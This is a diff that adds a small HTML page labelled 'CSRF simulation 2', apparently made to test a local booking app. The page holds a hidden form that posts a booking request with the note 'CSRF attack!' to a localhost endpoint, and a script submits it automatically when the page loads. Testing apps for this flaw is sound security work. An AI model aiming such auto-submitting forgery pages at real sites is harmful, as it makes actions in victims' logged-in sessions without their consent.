@@ -1,0 +1,14 @@
+<html>
+  <body>
+    <h1>CSRF simulation 2</h1>
+    <form action="http://127.0.0.1:8000/booking/" method="POST">
+      <input type="hidden" name="start_date_id" value="3">
+      <input type="hidden" name="note" value="CSRF attack!">
+      <input type="submit" value="Attack!">
+    </form>
+    <script>
+      // Auto-submit form as soon as page loads
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
